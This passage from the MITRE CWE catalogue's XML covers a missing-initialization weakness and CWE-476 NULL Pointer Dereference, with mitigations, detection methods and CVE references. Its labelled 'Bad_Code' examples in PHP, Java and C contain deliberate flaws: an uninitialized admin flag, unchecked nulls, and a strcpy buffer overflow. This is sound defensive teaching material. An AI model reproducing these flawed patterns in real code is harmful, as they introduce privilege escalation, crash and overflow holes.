                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>89</Relationship_Target_ID>
               <!--Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>120</Relationship_Target_ID>
               <!--Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>98</Relationship_Target_ID>
               <!--Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>998</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Glitch in Computation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>457</Relationship_Target_ID>
               <!--Use of Uninitialized Variable--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>This weakness is a major factor in a number of resultant weaknesses,
						especially in web applications that allow global variable initialization
						(such as PHP) with libraries that can be directly requested.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Technical_Impact>Unexpected state</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Quality degradation</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Varies by context</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>The uninitialized data may be invalid, causing logic errors within the
							program. In some cases, this could result in a security problem.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Check that critical variables are initialized.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Testing</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use a static analysis tool to spot non-initialized variables.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Here, an uninitialized field in a Java class is used in a
						seldom-called method, which would cause a NullPointerException to be
						thrown.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>private User user;</Code>
                     <Code>public void someMethod() {</Code>
                     <Block>
                        <Comment>// Do something interesting.</Comment>
                        <Code>...</Code>
                        <Code/>
                        <Comment>// Throws NPE if user hasn't been properly
									initialized.</Comment>
                        <Code>String username = user.getName();</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code first authenticates a user, then allows a delete command
						if the user is an administrator.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code>if (authenticate($username,$password) &amp;&amp;
								setAdmin($username)){</Code>
                     <Block>
                        <Code>$isAdmin = true;</Code>
                     </Block>
                     <Code>}</Code>
                     <Comment>/.../</Comment>
                     <Code>if ($isAdmin){</Code>
                     <Block>
                        <Code>deleteUser($userToDelete);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The $isAdmin variable is set to true if the user is an admin, but is
							uninitialized otherwise. If PHP's register_globals feature is enabled,
							an attacker can set uninitialized variables like $isAdmin to arbitrary
							values, in this case gaining administrator privileges by setting
							$isAdmin to true. </Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following Java code the BankManager class uses the user
						variable of the class User to allow authorized users to perform bank manager
						tasks. The user variable is initialized within the method setUser that
						retrieves the User from the User database. The user is then authenticated as
						unauthorized user through the method authenticateUser.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>public class BankManager {</Code>
                     <Code/>
                     <Block>
                        <Comment>// user allowed to perform bank manager tasks</Comment>
                        <Code>private User user = null;</Code>
                        <Code>private boolean isUserAuthentic = false;</Code>
                        <Code/>
                        <Comment>// constructor for BankManager class</Comment>
                        <Code>public BankManager() {</Code>
                        <Block>
                           <Code>...</Code>
                        </Block>
                        <Code>}</Code>
                        <Code/>
                        <Comment>// retrieve user from database of users</Comment>
                        <Code>public User getUserFromUserDatabase(String username){</Code>
                        <Block>
                           <Code>...</Code>
                        </Block>
                        <Code>}</Code>
                        <Code/>
                        <Comment>// set user variable using username</Comment>
                        <Code>public void setUser(String username) {</Code>
                        <Block>
                           <Code>this.user = getUserFromUserDatabase(username);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code/>
                        <Comment>// authenticate user</Comment>
                        <Code>public boolean authenticateUser(String username, String
									password) {</Code>
                        <Block>
                           <Code>if (username.equals(user.getUsername()) &amp;&amp;
										password.equals(user.getPassword())) {</Code>
                           <Block>
                              <Code>isUserAuthentic = true;</Code>
                           </Block>
                           <Code>}</Code>
                           <Code>return isUserAuthentic;</Code>
                        </Block>
                        <Code>}</Code>
                        <Code/>
                        <Comment>// methods for performing bank manager tasks</Comment>
                        <Code>... </Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>However, if the method setUser is not called before authenticateUser
							then the user variable will not have been initialized and will result in
							a NullPointerException. The code should verify that the user variable
							has been initialized before it is used, as in the following code.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>public class BankManager {</Code>
                     <Code/>
                     <Block>
                        <Comment>// user allowed to perform bank manager tasks</Comment>
                        <Code>private User user = null;</Code>
                        <Code>private boolean isUserAuthentic = false;</Code>
                        <Code/>
                        <Comment>// constructor for BankManager class</Comment>
                        <Code>public BankManager(String username) {</Code>
                        <Block>
                           <Code>user = getUserFromUserDatabase(username);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code/>
                        <Comment>// retrieve user from database of users</Comment>
                        <Code>public User getUserFromUserDatabase(String username)
									{...}</Code>
                        <Code/>
                        <Comment>// authenticate user</Comment>
                        <Code>public boolean authenticateUser(String username, String
									password) {</Code>
                        <Block>
                           <Code>if (user == null) {</Code>
                           <Block>
                              <Code>System.out.println("Cannot find user " +
											username);</Code>
                           </Block>
                           <Code>}</Code>
                           <Code>else {</Code>
                           <Block>
                              <Code>if (password.equals(user.getPassword())) {</Code>
                              <Block>
                                 <Code>isUserAuthentic = true;</Code>
                              </Block>
                              <Code>}</Code>
                           </Block>
                           <Code>}</Code>
                           <Code>return isUserAuthentic;</Code>
                        </Block>
                        <Code> }</Code>
                        <Code/>
                        <Block>
                           <Comment>// methods for performing bank manager tasks</Comment>
                           <Code>... </Code>
                        </Block>
                        <Code/>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2978</Observed_Example_Reference>
               <Observed_Example_Description>Product uses uninitialized variables for size and
						index, leading to resultant buffer overflow.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2109</Observed_Example_Reference>
               <Observed_Example_Description>Internal variable in PHP application is not
						initialized, allowing external modification.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2193</Observed_Example_Reference>
               <Observed_Example_Description>Array variable not initialized in PHP application,
						leading to resultant SQL injection.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Research_Gaps>
            <Research_Gap>
               <Text>It is highly likely that a large number of resultant weaknesses have
						missing initialization as a primary factor, but researcher reports generally
						do not provide this level of detail.</Text>
            </Research_Gap>
         </Research_Gaps>
         <References>
            <Reference Reference_ID="REF-7">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 7, "Variable Initialization", Page
						312.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Missing Initialization</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Glitch in computation</Mapped_Node_Name>
               <Mapped_Node_ID>SFP1</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Sean Eidemiller</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative
						examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms,
						Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Other_Notes,
						Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Name, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2013-02-21">Missing
						Initialization</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="476" Name="NULL Pointer Dereference" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>A NULL pointer dereference occurs when the application
					dereferences a pointer that it expects to be valid, but is NULL, typically
					causing a crash or exit.</Description_Summary>
            <Extended_Description>
               <Text>NULL pointer dereference issues can occur through a number of flaws,
						including race conditions, and simple programming omissions.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>808</Relationship_Target_ID>
               <!--2010 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">700</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>398</Relationship_Target_ID>
               <!--Indicator of Poor Code Quality--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>465</Relationship_Target_ID>
               <!--Pointer Issues--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>730</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A9 - Denial of Service--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>737</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 03 - Expressions (EXP)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>742</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 08 - Memory Management (MEM)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>871</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 03 - Expressions (EXP)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>876</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 08 - Memory Management (MEM)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>971</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Faulty Pointer Use--></Relationship>
         </Relationships>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Ordinality_Description>
                  <Text>NULL pointer dereferences are frequently resultant from rarely
							encountered error conditions, since these are most likely to escape
							detection during the testing phases.</Text>
               </Ordinality_Description>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Languages>
               <Language Language_Name="C"/>
               <Language Language_Name="C++"/>
               <Language Language_Name="Java"/>
               <Language Language_Name=".NET"/>
            </Languages>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>NULL pointer dereferences usually result in the failure of the process
							unless exception handling (on some platforms) is available and
							implemented. Even when exception handling is being used, it can still be
							very difficult to return the software to a safe state of
							operation.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>In very rare circumstances and environments, code execution is
							possible.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using dynamic tools and techniques that
							interact with the software using large test suites with many diverse
							inputs, such as fuzz testing (fuzzing), robustness testing, and fault
							injection. The software's operation may slow down, but it should not
							become unstable, crash, or generate incorrect results.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-12">
               <Method_Name>Manual Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>Identify error conditions that are not likely to occur during normal
							usage and trigger them. For example, run the program under low memory
							conditions, run with insufficient privileges or permissions, interrupt a
							transaction before it is completed, or disable connectivity to basic
							network services such as DNS. Monitor the software for any unexpected
							behavior. If you trigger an unhandled exception or similar error that
							was discovered and handled by the application's environment, it may
							still indicate unexpected conditions that were not handled by the
							application itself.</Text>
               </Method_Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>If all pointers that could have been modified are sanity-checked
							previous to use, nearly all NULL pointer dereferences can be
							prevented.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>The choice could be made to use a language that is not susceptible to
							these issues.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Check the results of all functions that return a value and verify that
							the value is non-null before acting upon it.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Moderate</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>Checking the return value of the function will typically be
							sufficient, however beware of race conditions (CWE-362) in a concurrent
							environment.</Text>
                  <Text>This solution does not handle the use of improperly initialized
							variables (CWE-665).</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Identify all variables and data stores that receive information from
							external sources, and apply input validation to make sure that they are
							only initialized to expected values.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Explicitly initialize all your variables and other data stores, either
							during declaration or just before the first usage.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Testing</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use automated static analysis tools that target this type of weakness.
							Many modern techniques use data flow analysis to minimize the number of
							false positives. This is not a perfect solution, since 100% accuracy and
							coverage are not feasible.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text> While there are no complete fixes aside from conscientious
						programming, the following steps will go a long way to ensure that NULL
						pointer dereferences do not occur. </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Mitigation_Code">
                     <Code>if (pointer1 != NULL) {</Code>
                     <Block>
                        <Comment>/* make use of pointer1 */</Comment>
                        <Comment>/* ... */</Comment>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>If you are working with a multithreaded or otherwise asynchronous
							environment, ensure that proper locking APIs are used to lock before the
							if statement; and unlock when it has finished.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-1">
               <Intro_Text>This example takes an IP address from a user, verifies that it is
						well formed and then looks up the hostname and copies it into a
						buffer.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>void host_lookup(char *user_supplied_addr){</Code>
                     <Block>
                        <Code>struct hostent *hp;</Code>
                        <Code>in_addr_t *addr;</Code>
                        <Code>char hostname[64];</Code>
                        <Code>in_addr_t inet_addr(const char *cp);</Code>
                        <Code/>
                        <Comment>/*routine that ensures user_supplied_addr is in the right
									format for conversion */</Comment>
                        <Code>validate_addr_form(user_supplied_addr);</Code>
                        <Code>addr = inet_addr(user_supplied_addr);</Code>
                        <Code>hp = gethostbyaddr( addr, sizeof(struct in_addr),
									AF_INET);</Code>
                        <Code>strcpy(hostname, hp-&gt;h_name);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>If an attacker provides an address that appears to be well-formed, but
							the address does not resolve to a hostname, then the call to
							gethostbyaddr() will return NULL. Since the code does not check the
							return value from gethostbyaddr (CWE-252), a NULL pointer dereference
							would then occur in the call to strcpy(). </Text>
                  <Text>Note that this example is also vulnerable to a buffer overflow (see
							CWE-119).</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following code, the programmer assumes that the system always
						has a property named "cmd" defined. If an attacker can control the program's
						environment so that "cmd" is not defined, the program throws a NULL pointer
						exception when it attempts to call the trim() method.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String cmd = System.getProperty("cmd");</Code>
                     <Code>cmd = cmd.trim();</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-110">
               <Intro_Text>This application has registered to handle a URL when sent an
						intent:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Comment>...</Comment>
                     <Code>IntentFilter filter = new
								IntentFilter("com.example.URLHandler.openURL");</Code>
                     <Code>MyReceiver receiver = new MyReceiver();</Code>
                     <Code>registerReceiver(receiver, filter);</Code>
                     <Comment>...</Comment>
                     <Code>public class UrlHandlerReceiver extends BroadcastReceiver {</Code>
                     <Block>
                        <Code>@Override</Code>
                        <Code>public void onReceive(Context context, Intent intent) {</Code>
                        <Block>
                           <Code>if("com.example.URLHandler.openURL".equals(intent.getAction()))
										{</Code>
                           <Block>
                              <Code>String URL =
											intent.getStringExtra("URLToOpen");</Code>
                              <Code>int length = URL.length();</Code>
                           </Block>
                           <Comment>...</Comment>
                           <Code>}</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The application assumes the URL will always be included in the intent.
							When the URL is not present, the call to getStringExtra() will return
							null, thus causing a null pointer exception when length() is
							called.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-3274</Observed_Example_Reference>
               <Observed_Example_Description>race condition causes a table to be corrupted if a
						timer activates while it is being modified, leading to resultant NULL
						dereference; also involves locking.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-1912</Observed_Example_Reference>
               <Observed_Example_Description>large number of packets leads to NULL
						dereference</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-0772</Observed_Example_Reference>
               <Observed_Example_Description>packet with invalid error status value triggers
						NULL dereference</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-4895</Observed_Example_Reference>
               <Observed_Example_Description>chain: race condition for an argument value,
						possibly resulting in NULL dereference</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3547</Observed_Example_Reference>
               <Observed_Example_Description>chain: race condition might allow resource to be
						released before operating on it, leading to NULL dereference
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3620</Observed_Example_Reference>
               <Observed_Example_Description>chain: some unprivileged ioctls do not verify that
						a structure has been initialized before invocation, leading to NULL
						dereference</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2698</Observed_Example_Reference>
               <Observed_Example_Description>chain: IP and UDP layers each track the same value
						with different mechanisms that can get out of sync, possibly resulting in a
						NULL dereference</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2692</Observed_Example_Reference>
               <Observed_Example_Description>chain: uninitialized function pointers can be
						dereferenced allowing code execution</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0949</Observed_Example_Reference>
               <Observed_Example_Description>chain: improper initialization of memory can lead
						to NULL dereference</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-3597</Observed_Example_Reference>
               <Observed_Example_Description>chain: game server can access player data
						structures before initialization has happened leading to NULL
						dereference</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5183</Observed_Example_Reference>
               <Observed_Example_Description>chain: unchecked return value can lead to NULL
						dereference</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0079</Observed_Example_Reference>
               <Observed_Example_Description>SSL software allows remote attackers to cause a
						denial of service (crash) via a crafted SSL/TLS handshake that triggers a
						null dereference.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0365</Observed_Example_Reference>
               <Observed_Example_Description>Network monitor allows remote attackers to cause a
						denial of service (crash) via a malformed RADIUS packet that triggers a null
						dereference.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2003-1013</Observed_Example_Reference>
               <Observed_Example_Description>Network monitor allows remote attackers to cause a
						denial of service (crash) via a malformed Q.931, which triggers a null
						dereference.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2003-1000</Observed_Example_Reference>
               <Observed_Example_Description>Chat client allows remote attackers to cause a
						denial of service (crash) via a passive DCC request with an invalid ID
						number, which causes a null dereference.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0389</Observed_Example_Reference>
               <Observed_Example_Description>Server allows remote attackers to cause a denial
						of service (crash) via malformed requests that trigger a null
						dereference.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0119</Observed_Example_Reference>
               <Observed_Example_Description>OS allows remote attackers to cause a denial of
